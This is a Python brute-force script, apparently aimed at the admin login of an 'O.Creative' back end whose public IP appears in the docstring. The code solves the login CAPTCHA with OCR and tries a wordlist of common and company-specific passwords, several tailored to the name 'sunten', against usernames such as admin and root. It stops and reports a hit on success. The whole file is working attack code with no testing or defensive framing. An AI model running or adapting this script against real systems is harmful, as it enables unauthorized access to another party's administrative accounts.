#!/usr/bin/env python3
"""sunten_bf.py - 113.96.190.199 O.Creative后台最终爆破
验证码: 81.70 getcap_st.php下载PNG -> 165 OCR -> login_st.php提交
判定: {"error":0}=成功, {"error":2,"msg":"验证码不正确"}=重取, 其他=密码错
"""
import urllib.request, urllib.parse, ssl, re, sys, time, io, json
import ddddocr
from PIL import Image

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
HOST = 'http://127.0.0.1:13080'
CAPIMG = HOST + '/st_cap.jpg'
LOGIN = HOST + '/login_st.php'

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "admin666", "123123", "111111",
             "654321", "admin2023", "admin2024", "Admin123", "123qwe", "zxcvbnm",
             "admin12345", "sunten", "sunten123", "sunten2024", "ocreative",
             "suntentech", "123456789", "1qaz2wsx", "qwe123", "admin!@#",
             "sunten2023", "suntensz", "st2024", "adminadmin"]

ocr = ddddocr.DdddOcr(show_ad=False)
ocrb = ddddocr.DdddOcr(show_ad=False, beta=True)

def fetch(url, timeout=30):
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=timeout, context=ctx)
        return r.read(30000)
    except Exception:
        return b''

def get_cap():
    out = fetch(HOST + '/getcap_st.php')
    if b'SAVED:' not in out:
        return None
    try:
        r = urllib.request.urlopen(urllib.request.Request(CAPIMG, headers=UA), timeout=15, context=ctx)
        return r.read()
    except Exception:
        return None

def do_login(pw, code):
    out = fetch(LOGIN + '?u=admin&p=' + urllib.parse.quote(pw) + '&c=' + code)
    idx = out.find(b'GIF89a')
    body = out[idx+6:] if idx > 0 else out
    # 提取JSON
    m = re.search(rb'\{[^}]*\}', body)
    if not m:
        return 'nojson', ''
    try:
        d = json.loads(m.group(0).decode('utf-8'))
        return d.get('error'), d.get('msg', '')
    except Exception:
        return 'parse_err', m.group(0)[:100]

def main():
    for user in ['admin', 'root', 'test', 'sunten', 'manager']:
        print('=== user %s ===' % user, flush=True)
        for pw in PASSWORDS:
            for attempt in range(8):
                img = get_cap()
                if not img or len(img) < 50:
                    time.sleep(3)
                    continue
                try:
                    c1 = ocr.classification(img)
                    im = Image.open(io.BytesIO(img)).convert('L')
                    im = im.resize((im.width * 4, im.height * 4), Image.LANCZOS)
                    im = im.point(lambda p: 255 if p > 120 else 0)
                    buf = io.BytesIO(); im.save(buf, 'PNG')
                    c2 = ocrb.classification(buf.getvalue())
                except Exception:
                    break
                code = c1 if c1 == c2 else (c2 if len(c2) == 4 else c1)
                err, msg = do_login(pw, code)
                if err == 2 or '验证码' in str(msg):
                    continue  # 验证码错
                if err == 0 or err is None:
                    print('!!! HIT: %s/%s' % (user, pw), flush=True)
                    print('  resp: err=%s msg=%s' % (err, msg), flush=True)
                    sys.exit(0)
                if err == 1:
                    print('pw-wrong %s/%s' % (user, pw), flush=True)
                    time.sleep(1.5)
                    break
                print('CHECK %s/%s: err=%s msg=%s' % (user, pw, err, msg[:60]), flush=True)
                time.sleep(1.5)
                break
        print('user %s done' % user, flush=True)
    print('=== NO HIT ===')

if __name__ == '__main__':
    main()
